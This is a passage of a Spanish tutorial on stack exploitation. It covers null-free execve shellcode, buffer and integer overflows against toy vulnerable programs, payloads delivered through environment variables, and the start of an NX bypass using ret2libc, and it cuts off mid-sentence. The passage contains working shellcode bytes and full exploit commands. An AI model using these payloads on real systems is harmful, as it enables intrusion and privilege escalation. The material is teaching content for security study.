+	  4000a2:	bf 01 00 00 00       	mov    edi,0x1
+	  4000a7:	b8 3c 00 00 00       	mov    eax,0x3c
+	  4000ac:	0f 05                	syscall
+
+Se pueden apreciar entre las direcciones de memoria y el código maquina los opcodes
+por instrucción. El procesador en realidad lee binario, pero se muestra en hexadecimal
+para el usuario porque ocupa menos espacio. Muchos de éstos opcodes son \x00 (byte
+nulo) lo que indica fín de la cadena dentro de un buffer, por eso la habilidad de
+escribir shellcode consiste en escribir código maquina y convertir las instrucciones
+para que impriman bytes ordinarios en vez de bytes nulos, tratando de que las
+instrucciones ocupen el menor peso posible. Por lo menos cuándo se trata de buffers
+pequeños y de funciones que no copian bytes nulos.
+
+Para empezar a convertir éstos bytes cambiamos por ejemplo:
+
+Podemos convertir todas las instrucciones que cargan 0x0 en un registro usando la
+compuerta lógica XOR, un xor entre el mismo registro setea todos los bytes a cero.
+
+	mov 	edx, 0x0 		<-->			xor 	edx, edx
+
+Si nos fijamos la instrucción mov eax, 0x3b y mov eax, 0x3c está cargando en en
+cada respectivo registro el id de syscall que es un número que se puede escribir
+en seis bits o en una palabra por ello podemos hacer mov AL, $id, AL es el byte
+menos significativo del registro RAX y es suficiente para almacenar $59 o $60.
+
+La instrucción mov 	rdi, 0x1 puede ser reemplazada pusheando 0x1 al stack y popeando
+el último valor pusheado en el registro RDI.
+
+Casí está listo, sólo queda revisar la instrucción mov qword rbx, '/bin/sh', se vé en
+el objdump que se produce un salto de línea en bytes y finaliza en 00. La cadena
+'/bin/sh' por defecto generará un opcode terminado en 0. Así que hay dos caminos
+posibles que terminarán siendo lo mismo:
+
+	[*] Escribir un caracter más al inicio del string y shifearlo un byte a la
+		a la derecha. Cómo estoy en little-endian el shift se le aplica al
+		byte '/'
+				Por ejemplo:
+									mov 	qword rbx, '//bin/sh/'
+									shr     rbx, 0x8
+
+	[*] Escribir la cadena en ascii en formato little endian con un byte agregado y
+		shiftearlo un byte a la derecha.
+
+Mostraré como hacer el segundo camino, para que se entienda la endianidad.
+
+Podemos escribir la cadena '/bin/sh' en ascii:
+2f = '/', 62 = 'b', 69 = 'i', 6e = 'n', 2f = '/', 73 = 's', 68 = 'h'
+
+'/bin/sh' = 2f 62 69 6e 2f 73 68
+
+little-endian = 'hs/nib/' = 68 73 2f 6e 69 62 2f
+
+Agregamos un byte más a la cadena para que esa posición no quede nula,
+68 73 2f 6e 69 62 2f 2f = 'hs/nib//' y las nuevas instrucciones son:
+
+	mov     qword rbx, '/bin/sh' 				mov 		rbx, 0x68732f6e69622f2f
+  push    rbx 												shr		 	rbx, 0x8
+  mov 		rdi, rsp										push    rbx
+    																	mov     rdi, rsp
+
+      	VIEJO																NUEVO
+
+Después de hacer shift a la derecha el registro RBX queda así 0x68732f6e69622f,
+no se agregaron caracteres nulos a los opcodes y tenemos la cadena '/bin/sh' en
+memoria. Se debe hacer así para que funcione en las funciones que no verifican
+los límites en los argumentos y se sobreescriba de manera correcta el registro
+RIP.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		llamada.asm
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+global _start
+
+_start:
+	xor 	edx, edx
+	xor 	esi, esi
+
+  mov     rbx, 0x68732f6e69622f2f
+  shr     rbx, 0x8
+	push    rbx
+	mov     rdi, rsp
+
+	mov 	al, 0x3b
+	syscall
+
+	xor 	rax, rax
+	push	0x1
+	pop		rdi
+	mov 	al, 0x3c
+	syscall
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Para extraer el shellcode:
+
+	$ nasm -f elf64 llamada.asm
+	$ for i in $(objdump -d llamada.o | grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
+
+	\x31\xd2\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x2f\x48\xc1\xe3\x08\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x31\xc0\x6a\x01\x5f\xb0\x3c\x0f\x05
+
+Este shellcode pesa 40 bytes, entonces es necesario un buffer de más de 41 caracteres
+para almacenarlo, y para saber cuántos bytes pesa un shellcode:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		size.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#include <stdio.h>
+#include <string.h>
+
+void main(){
+	char cadena[] = "\x31\xd2\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x2f\x48\xc1\xe3\x08\x48\xc1\xeb\x08\x53\x48\x89\xe7\xb0\x3b\x0f\x05\x48\x31\xc0\x6a\x01\x5f\xb0\x3c\x0f\x05";
+
+	printf("Pesa: %d bytes\n", strlen(cadena));
+
+}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+El shellcode es pesado para un buffer ordinario, así que vamos a tratar de
+achicarlo aún más haciendo solamente push/pop de los registros:
+
+global _start
+
+_start:
+    mov     rbx, 0x68732f6e69622f2f     ; Cargar en RBX la cadena '//bin/sh'
+    shr     rbx, 0x8 										; Shift-right y la cadena es '/bin/sh'
+    push    rbx                         ; push rbx
+                                        ; ahora el stack pointer apunta a '/bin/sh'
+    push    rsp                         ; push del stack pointer
+    pop     rdi                         ; pop '/bin/sh' puntero a RDI
+    xor     edx, edx                    ; Setear EDX en 0
+    xor     esi, esi                    ; Setear ESI en 0
+    mov     al, 0x3b                    ; Cargar $59 en AL
+    syscall                             ; Invoca llamada al sistema
+    push    0x1                         ; push $1
+    pop     rdi                         ; pop $1 a RDI
+    mov     al, 0x3c                    ; Cargar $60 en AL
+    syscall                             ; Invoca llamada al sistema
+
+Si compilamos y linkeamos éste nuevo shellcode pesa 32 bytes y todavía podríamos
+sacarle la invocación a exit y más, pero sin maś vueltas, vamos a probar éste
+shellcode usando un programa C que castee el shellcode como un puntero de una
+función void que toma un número no especificado de parámetros y lo corra a la
+vez.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		shellTest.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+char const shellcode[] = "";
+
+void main(){
+	(*( void(*)() ) shellcode )();
+}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+void(*)() es la función que no devuelve nada y toma un número no especificado de
+parámetros. Casteamos shellcode como un puntero de ésta función e invocamos la
+desrefencia ya que ahora shellcode() es una función. Otra forma de verlo es
+shellcode se castea como una función y es apuntado por un puntero de función
+que se ejecuta.
+
+Si te diste cuenta, shellcode[] se declara const y global esto es porque el
+stack está marcado como de solo lectura para evitar ésta restricción se coloca
+el código que se desea ejecutar en el segmento .data (DS) que es donde se
+encuentran las variables globales o puede compilar con el indicador
+-z execstack que marca como zona ejecutable el stack:
+
+	$ gcc shellTest.c -o shellTest
+	$ ./shellTest
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Algunas consideraciones
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Hay muchas maneras de saltearse los bytes nulos, entre ellas por ejemplo cuándo
+tenemos que cargar 0x3b al registro AL podemos hacerlo cargando 0x13b al registro RAX
+y decrementando (en éste ejemplo, también se puede incrementar) un bit al registro AH.
+
+		0x13B	= 1 0011 1011 			mov     rax, 0x13b
+		0x3b	= 0 0011 1011 			dec     ah
+
+El incremento/decremento de un bit se lee de derecha a izquierda.
+O cargar por ejemplo en RAX el valor 0x33 y sumarle 0x8 para tener 0x3b en el registro.
+
+	mov     rax, 0x33
+	add     al, 0x8
+
+Si se trabaja con el registro EDX la instrucción cqo llena todos los bits del registro
+EDX con el bit 63 del regitro EAX que es el signo (+ o -), si EAX es un número
+negativo se setean todos los bits del registro EDX con 1, si EAX es un número no
+negativo (cero o positivo) se setean todos los bits del registro EDX con 0. Ésta
+instrucción es un byte más pequeña que la instrucción XOR.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[3]- Stack buffer overflow
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Un buffer es un espacio de memoria, en el que se almacenan datos de manera
+temporal, puede ser una variable local/global/estática y posee las siguientes
+características:
+
+	[*]	Espacio: es la memoria en donde se guarda la información almacenada en el
+		buffer
+	[*] Dirección: indica en donde está el espacio
+	[*] Dimensión: indica el tamaño del espacio
+	[*] Índice o particiones: indica cómo se reparte la información almacenada en el
+		buffer
+
+Se produce un desbordamiento en el buffer cuando la dimensión del buffer es
+insuficiente para almacenar la información que se le asigna y ésto provoca que el
+programa escriba la información en una dirección de memoria fuera de la estructura de
+datos prevista. Por ejemplo si tengo un buffer de 8 bytes y escribo en él una palabra
+de 22 bytes.
+
+	void main(){
+		char buffer[8];
+
+		for(int i ; i < 22 ; i++){
+			buffer[i] = "A";
+		}
+	}
+
+Esto da como resultado la corrupción de datos adyacentes en el stack, sobreescribiendo
+las direcciones a las que apuntan el registro BP e IP, y generando errores de
+segmentación y bus. La principal diferencia entre un 'segmentation fault' y un
+'bus error' es que el segmentation fault indica un acceso no válido a una memoria
+válida, mientras que el bus error indica un acceso a una dirección no válida.
+
+Un buffer de strings de dimensión 8 requiere 9 bytes para almacenar información,
+porque la información que se ingrese estará seguida por el carácter de byte nulo. El
+byte nulo (\x00) siempre sobrescribirá una ubicación de memoria que está un byte más
+allá del final de un buffer de strings.
+
+El método tradicional para hacer uso malintencionado de un stack buffer overflow es
+sobrescribir la dirección de retorno de la función con un puntero que apunte a los
+datos controlados por el atacante. Si el programa posee el bit SUID configurado para
+ejecutarse como superusuario, entonces el atacante podría usar esta vulnerabilidad
+para obtener privilegios de superusuario en la máquina afectada.
+
+En general, cualquier función que no verifica los límites en los argumentos puede
+ser utilizada para éstos propósitos, por ejemplo: gets(), scanf(), strcpy(), strcat(),
+read(), memcpy()
+
+Destaco que read() y memcpy() copian bytes nulos.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[3.1]- Cambiar el flujo de ejecución usando un buffer y un puntero
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Entonces un buffer de 5 bytes ocupa un espacio real de 6 bytes y la memoria solo se
+puede asignar en múltiplos del tamaño de una palabra. Según la arquitectura una palabra
+puede pesar 4 bytes (32 bits) o 8 bytes (64 bits).
+
+En arquitecturas de 64 bits el espacio designado para guardar un buffer de 5 bytes es
+de una palabra (8 bytes), si se escriben más de 5 bytes se estará sobreescribiendo el
+registro BP, para sobreescribir el total de BP se necesitarán 5+8 = 13 bytes y para
+sobreescribir el total del registro IP y controlar la dirección de retorno se necesitan
+13 + 8 = 21 bytes.
+
+En arquitecturas de 32 bits el espacio designado para guardar un buffer de 5 bytes es
+de dos palabras (8 bytes), si se escriben más de 5 bytes se estará sobreescribiendo el
+registro BP, para sobreescribir el total de BP se necesitarán 5+4 = 9 bytes y para
+sobreescribir el total del registro IP y controlar la dirección de retorno se necesitan
+9 + 4 = 13 bytes.
+
+					|										|
+					|-------------------|
+					| 	 instruction		|
+					|	   pointer	(IP)	|
+					|-------------------|
+					| frame base pointer|
+					| 		 (BP)					|
+					|-------------------|
+					|[1] [2] [3] [4] [5]|
+					| X	X X8 bytesX X[0]|
+					| X X X X X X X X X	|
+					|-------------------|
+					|										|
+									Fig 4
+
+La figura 4 representa un stack frame que guarda un buffer de 5 bytes en sus variables
+locales. Una vez que se escriban los 5 bytes del buffer, se empezará a sobreescribir
+el registro BP y lo mísmo pasará con el registro IP si se continúa.
+
+Los siguientes dos ejemplos muestran como cambiar el flujo de ejecución de un programa,
+y lograr que devuelvan distintos resultados.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Ejemplo 1 - Arquitectura 64 bits
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	#include <stdio.h>
+
+	void miFuncion(int a, int b, int c){
+		char buffer[5];
+		int *nuevoRetorno;
+
+		nuevoRetorno = buffer + 21;
+		(*nuevoRetorno) += 4;
+	}
+
+	void main(){
+		int varX = 0;
+
+		miFuncion(1, 2, 3);
+
+		varX++;
+
+		printf("Valor de carl1tos: %d\n", varX);
+	}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Ejemplo 2 - Arquitectura 32 bits
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	#include <stdio.h>
+
+	void miFuncion(int a, int b, int c){
+		char buffer[5];
+		int *nuevoRetorno;
+
+		nuevoRetorno = buffer + 13;
+		(*nuevoRetorno) += 10;
+	}
+
+	void main(){
+		int x = 0;
+
+		miFuncion(1, 2, 3);
+
+		x = 1;
+
+		printf("Valor de carl1tos: %d\n", x);
+	}
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Para el resto de la guía solo ejemplificaré arquitecturas de 64 bits. Vamos a
+investigar porque el primer ejemplo imprime el valor de carl1tos igual a 0 en
+lugar de 1.
+
+Cómo vimos *nuevoRetorno es un puntero que se inicializa nulo, después lo hacemos
+apuntar hacia la dirección de buffer más 21 bytes. En éste momento el puntero
+nuevoRetorno apunta a la dirección del registro IP que guarda la dirección de
+la próxima instrucción a ser ejecutada, es en éste momento en el que podemos
+sumarle o restarle un valor a la dirección guardada en el registro IP para que
+cambie y se ejecute otra instrucción.
+
+Lo compilamos y lo debuggeamos:
+
+	$ gcc -g ejemplo1.c -o programa
+	$ gdb -q programa 						#el indicador -q para un inicio limpio
+
+	[Ctrl+L] clear screen.
+
+	$ (gdb) set disassembly-flavor intel	#usado para mostrar el código maquina con
+											#notación intel en lugar de at&t
+
+	$ (gdb) run 							#corremos el programa para que se cargue
+											#en memoria
+
+	$ (gdb) disas main 						#muestra el código maquina
+
+	Dump of assembler code for function main:
+
+		....
+
+	   0x00005555555546f9 <+30>:	call   0x5555555546b0 <miFuncion>
+	   0x00005555555546fe <+35>:	add    DWORD PTR [rbp-0x4],0x1
+	   0x0000555555554702 <+39>:	mov    eax,DWORD PTR [rbp-0x4]
+	   0x0000555555554705 <+42>:	mov    esi,eax
+
+		....
+
+	End of assembler dump.
+
+Cómo vemos la dirección de retorno de miFuncion será 0x00005555555546fe y queremos
+saltar más allá de 0x0000555555554702. Entonces 4702(h) - 46fe(h) = 4(h) y 4(h) es
+igual a 4 en decimal.
+Otra forma de verlo es si nos fijamos la instrucción 0x00005555555546fe está a 35 y
+la instrucción 0x0000555555554702 está a 39 bytes desde el main, 39 - 35 = 4.
+
+Ya sabemos que el valor que queremos sumar a la dirección guardada en el registro IP
+es 4. Con ésto se sobreescribe el valor de retorno de miFuncion y por resultado
+se saltea el incremento de la variable varX.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[3.2]- Inyectar código en un programa usando un buffer
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Para hacer éste experimentos es necesario desactivar el ASLR desde el root y
+	compilar el programa con el indicador execstack.
+
+	$ echo 0 > /proc/sys/kernel/randomize_va_space
+
+	Vuelvalo a activar al terminar, éste es el experimento más básico así que pruebe
+	desactivando todas las restricciones, en mi caso solo desactivar esas dos anduvo.
+	En experimentos posteriores veremos como saltarnos éstas restricciones.
+
+	Suponga que tenemos un programa y sabemos que el código de ése programa contiene
+funciones que no verifican los límites en los argumentos, más precisamente el siguiente
+código de fantasía:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		vulnerable.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+
+	int main(int argc, char **argv){
+		char buffer[128];
+
+		if(argc != 2){ exit(0); }
+
+		printf("%p\n", buffer);
+		strcpy(buffer, argv[1]);
+		printf("%s\n", buffer);
+
+		return 0;
+	}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	$ gcc -g vulnerable.c -o vuln -z execstack
+
+El uso de la función strcpy() de la biblioteca string.h nos abre paso a experimentar
+muchas cosas. Si desbordamos el buffer y sobreescribimos la dirección que guarda el
+instruction pointer por una dirección que apunte al buffer en cuestión o a una variable
+de entorno donde haya guardado previamente shellcode.
+
+Primero vamos a asegurarnos de que la función tiene una vulnerabilidad de overflow.
+Si me permite voy a usar un pequeño código de python desde el prompt para ello.
+
+	$ ./vuln $(python -c 'print "A" * 300')
+	0x7ffd9fda1010
+	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	Violación de segmento
+
+Ejecuté vuln y le envié trescientos caracteres "A" y efectivamente el promt lanzó un
+segmentation fault.
+
+Segundo debemos calcular exacto el desplazamiento (offset) de la dirección de retorno.
+Podemos hacerlo con gdb haciéndo un cálculo matemático, si miramos el stack pointer
+justo después de haber ejecutado la función strcpy() en la línea print del contenido
+del buffer, y lo observamos después:
+
+	$ gdb vuln
+	$ (gdb) b 12 						# breakpoint en el print del buffer
+	$ r $(python -c 'print "A" * 300') 	# corremos el programa desbordándolo
+
+	Breakpoint 1, main (argc=2, argv=0x7fffffffe098) at vulnerable.c:12
+	12		printf("%s\n", buffer);
+
+	$ (gdb) x/4xg $rsp
+	0x7fffffffdf20:	0x00007fffffffe098	0x0000000200000000
+	0x7fffffffdf30:	0x4141414141414141	0x4141414141414141
+
+Imprimimos las primeras dos direcciones del stack pointer con el comando x,
+(le indicamos que traiga cuatro palabras gigantes[g] en hexadecimal[x])
+precisamente es la segunda dirección la que nos interesa y le decimos a gdb que
+continúe corriendo el programa hasta que reciba un signal de error con el comando
+next.
+
+	$ (gdb) n
+	$ (gdb) n
+	$ (gdb) n
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x00005555555547f2 in main (argc=2, argv=0x7fffffffe098) at vulnerable.c:15
+	15	}
+
+	(gdb) x/4xg $rsp
+	0x7fffffffdfb8:	0x4141414141414141	0x4141414141414141
+	0x7fffffffdfc8:	0x4141414141414141	0x4141414141414141
+
+De ésta impresión nos interesa la primer dirección del registro RSP.
+
+El offset exacto donde se encuentra el registro RIP es:
+
+	0x7fffffffdfb8 (h) - 0x7fffffffdf30 (h) = 88 (h) = 136 (d)
+
+Ahora vamos a tratar de inyectar el shellcode de 32 bytes que desarrollamos atrás
+guardándolo en el buffer mismo y para el cálculo de desplazamiento del shellcode y
+el relleno es:
+
+	136 (d) - 32 (d) = 104 (d)
+
+Entonces tenemos la siguiente estructura: shellcode + relleno + dirección de retorno
+
+shellcode ya lo escribímos anteriormente, relleno pueden 104 bytes de lo que sea,
+es una buena práctica usar instrucciones NOP (0x90), y dirección IP.
+
+Probamos:
+
+$ ~/directorio/a/./vuln $(python -c 'print "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x31\xd2\x31\xf6\xb0\x3b\x0f\x05\x6a\x01\x5f\xb0\x3c\x0f\x05" + "A" * 104 + "\x7f\xff\xff\xff\df\xf0"[::-1]')
+0x7fffffffe010
+H�//bin/shH�ST_1�1��;j_�<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�fd\���
+Violación de segmento
+
+Cómo vemos lanza segmentation fault, pero és porque la dirección de retorno se está
+sobreescribiéndo con \x7f\xff\xff\xff\df\xf0 que es una apróximación y por eso dejé un
+printf de la dirección donde empieza el espacio asignado para el buffer en memoria de
+nuestro código vulnerable de fantasía y es 0x7fffffffe010.
+
+Probamos nuevamente cambiando la dirección IP por la que imprimimos:
+
+$ ~/directorio/a/./vuln $(python -c 'print "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x31\xd2\x31\xf6\xb0\x3b\x0f\x05\x6a\x01\x5f\xb0\x3c\x0f\x05" + "A" * 104 + "\x7f\xff\xff\xff\xe0\x10"[::-1]')
+0x7fffffffe010
+H�//bin/shH�ST_1�1��;j_�<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
+$ whoami
+carlitos
+$ exit
+
+Y pudimos inyectar el shellcode en el buffer e invocarlo al hacer que el instruction
+pointer apunte hacia él cuando termina la función y se ejecuta la instrucción ret.
+
+Añado que escribo la dirección "\x7f\xff\xff\xff\xe0\x10"[::-1] con [::-1] que es la
+nomenclatura de python para que lea los caracteres al reves porque mi computadora es
+una arquitectura little-endian, si fuese una computadora big-endian no haría falta.
+
+Otro detalle sutil pero importante: hay una diferencia entre llamar a ./vuln y
+~/directorio/a/./vuln: dado que argv[0] mantiene el programa exactamente como lo
+invocó, debe garantizar cadenas de invocación iguales. Es por eso que usé
+~/directorio/a/./vuln en el ejemplo y no solo ./vuln para inyectar el código.
+
+Tenga en cuenta que si se desconoce la dirección donde empieza el espacio asignado
+para el buffer puede depurar el código con gdb y buscar una aproximación hacia donde
+debe estar el shellcode, escriba una estructura cómo:
+
+			NOP + shellcode + relleno + dirección de retorno
+
+La instrucción NOP (/x90) significa 'no operation' o 'hacer nada' y es un colchón que
+se puede usar para ejecutar shellcode sin estimar la dirección exacta de inicio del
+buffer.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[3.3]- Inyectar código en un programa usando una variable de entorno
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Continúemos con el mismo programa vulnerable de fantasía pero ésta vez no queremos
+guardar el shellcode en el buffer, vamos guardar el shellcode en una variable de
+entorno en el stack y cambiar la dirección de retorno del programa para que apunte a
+esa variable de entorno y se ejecute desde ahí.
+
+export MIVAR=`python -c 'print "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x31\xd2\x31\xf6\xb0\x3b\x0f\x05\x6a\x01\x5f\xb0\x3c\x0f\x05"'`
+
+Vamos a necesitar encontrar la dirección de MIVAR en el stack del programa. Para eso
+voy a usar un fragmento de código del libro Hacking: The Art of Exploitation,
+2nd Edition:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		getenvaddr.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+		printf("Uso: %s <variable de entorno> <nombre del programa destino>\n", argv[0]);
+		exit(0);
+	}
+
+	ptr = getenv(argv[1]); /* obtiene la ubicacion de la variable de entorno */
+	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* ajustar para el nombre del programa */
+	printf("%s estará en %p\n", argv[1], ptr);
+}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	$ gcc getenvaddr.c -o getenvaddr
+	$ ./getenvaddr MIVAR ./vuln
+	MIVAR estará en 0x7fffffffed9a
+
+Note que usé la ruta corta ./vuln, y getenvaddr me respondió la dirección donde se
+va a encontrar MIVAR cuando ejecute ./vuln, si hubiera usado la ruta absoluta
+~/directorio/a/./vuln va a responder la dirección donde se va a encontrar MIVAR cuando
+ejecute ~/directorio/a/./vuln .
+
+	$ ./vuln $(python -c 'print "A" * 136 + "\x7f\xff\xff\xff\xed\x9a"[::-1]')
+
+Nos dará acceso a un shell como del ejemplo anterior pero está vez ejecutado desde
+una variable de entorno.
+
+
+Experimentar con overflow y variables de entorno tiene muchas variantes, también el
+programa vulnerable puede usar variables de entorno dentro del código y si
+rellenamos esa variable (que es una variable conocida y confiable) se puede
+desbordar el buffer.
+
+Puede ver las variables de entorno que se ejecutan en el programa:
+
+	$ gdb vuln
+	$ (gdb) show env
+
+O imprimiendo una gran cantidad de memoria en el stack cómo cadena:
+
+	$ x/800s $rsp
+
+Puede borrar una variable de entorno en gdb y ver que sucede:
+
+	$ (gdb) unset env VAR
+
+Para ver en que dirección de memoria se encuentra una variable de entorno en gdb:
+
+	$ (gdb) r
+	$ (gdb x/s *((char **)environ + LINEA )			# LINEA es un número
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[4]- Stack integer overflow
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Existe otro tipo de stack overflow y es el de los enteros, que sucede cuándo se
+intenta almacenar un número más grande del que una variable puede almacenar debido a su
+tipo.
+
+		Tipo 		tamaño 			rango
+		--------------------------------------------------------------
+
+		char  		1 byte 			signed: -128 a 127
+													unsigned: 0 a 255
+
+		short 		2 bytes 		signed: -32768 a 32767
+													unsigned: 0 a 65535
+
+		int/long 	4 bytes 		signed: -2147483648 a 2147483647
+													unsigned: 0 a 4294967295
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+		integerOverflow.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void main(int argc, char **argv){
+	char buffer[128];
+	unsigned char longitud = strlen(argv[1]);
+
+	if (argc != 2){ exit(0); }
+
+	printf("%p\n", buffer);
+
+	if(longitud >= 5 && longitud <= 10){
+		strcpy(buffer, argv[1]);
+		printf("Argumento OK\n");
+	} else {
+		printf("Argumento muy largo o muy corto\n");
+	}
+
+}
+
+longitud es una variable char sin signo que almacena la longitud del argumento pasado,
+si el argumento que se le pasa al programa tiene una longitd menor a 5 o mayor a 10,
+el argumento no se copiará en el buffer.
+
+Si se le pasa un argumento que esté en el rango pertidido copia y imprime, pero
+también lo hara si se le pasa un argumento de modo tal que desborde la variable
+longitud. unsigned char longitud puede almacenar hasta un byte o 255 (d) luego de eso
+volverá a contar desde 0. Entonces si le pasas un argumento de longitud 255 + 8 por
+ejemplo el argumento entrará en la zona crítica o de copiado porque 255 + 8 = 7.
+
+Ejecute el programa:
+
+	$ ./inteof $(python -c 'print "A" * 263')
+
+El argumento será copiado y posterior lanzará violación de segmento. Cómo hemos dicho
+en arquitecturas de 64 bits la dirección IP solo puede ser reescrita por una
+dirección canonica y dado que no hay forma de escribir byte nulos sin que el
+interprete piense que llegó al fin de programa, ésta vulnerabilidad no es muy
+susceptible a inyecciones de código.
+
+Ejemplo:
+
+	offset = 152
+
+	$ ./inteof $(python -c 'print "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x54\x5f\x31\xd2\x31\xf6\xb0\x3b\x0f\x05\x6a\x01\x5f\xb0\x3c\x0f\x05" + "A" * 120 + "\x7f\xff\xff\xff\xed\x8a"[::-1] + "\x00\x00" + "102" * "A"')
+
+Es imposible llenar el instruction pointer con una dirección canonica de 8 bytes y a
+su vez desbordar la variable longitud.
+
+Underflow se refiere al desbordamiento de enteros negativos.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[5]- Evitar la prevención de ejecución de datos (bit NX)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	Cómo observamos cuándo compilas el código para probar nuestro ejemplo de fantasía
+se le debe indicar a gcc que marque el stack como zona ejecutable y también
+desactivamos la aleatoriedad en la disposición del espacio de direcciones. Podemos
+pasar por alto de la restricción bit NX haciendo lo que se conoce ret2libc (retornar
+a una biblioteca de c), que trata de saltar a una función ya escrita de las bibliotecas
+de c que están en zonas marcadas ejecutables. Ésto significa que nuestro código no se
+ejecutará desde el buffer sino desde la propia biblioteca de c. Para llevar a cabo el
+experimento hay que sobreescribir el instruction pointer con una dirección con el
+mecanismo que ejecute un shell.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	ejecutar.c
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+	#include <stdio.h>
+
+	void main(){
+		execve("/bin/sh", NULL, NULL);
+	}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Éste es el programa que queremos que se ejecute, a partir de un programa vulnerable
